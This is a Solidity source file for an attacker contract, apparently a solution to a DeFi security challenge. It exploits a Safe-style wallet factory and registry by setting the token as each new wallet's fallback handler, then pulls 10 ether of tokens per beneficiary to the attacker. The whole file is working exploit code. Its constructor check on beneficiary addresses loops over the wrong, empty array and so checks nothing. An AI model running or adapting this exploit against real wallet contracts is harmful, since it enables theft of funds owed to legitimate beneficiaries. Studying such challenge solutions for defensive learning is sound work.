// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Factory {
    function createProxyWithCallback(
        address singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address);
}

interface Safe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external;
}

contract BackdoorAttacker {
    address public safe;
    Factory public factory;
    address public token;
    address public registry;
    address[] public beneficiaries;
    address public owner;

    constructor (
        address _safe,
        address _factory,
        address _token,
        address _registry,
        address[] memory _beneficiaries
    ) {
        require(_safe != address(0), "invalid safe address");
        require(_factory != address(0), "invalid factory address");
        require(_token != address(0), "invalid token address");
        require(_registry != address(0), "invalid registry address");

        uint256 beneficiariesLength = beneficiaries.length;
        for (uint256 i = 0; i < beneficiariesLength; i++) {
            require(beneficiaries[i] != address(0), "invalid beneficiary address");
        }

        safe = _safe;
        factory = Factory(_factory);
        token = _token;
        registry = _registry;
        beneficiaries = _beneficiaries;

        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "caller is not owner");

        uint256 beneficiariesLength = beneficiaries.length;
        for (uint256 i = 0; i < beneficiariesLength; i++) {
            address beneficiary = beneficiaries[i];
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            address wallet = factory.createProxyWithCallback(
                safe,
                abi.encodeWithSelector(
                    Safe.setup.selector, 
                    owners,
                    1,
                    address(0),
                    0x0,
                    token,
                    address(0),
                    0,
                    address(0)
                ),
                0,
                registry 
            );

            IERC20(wallet).transfer(owner, 10 ether);
        }
    }
}
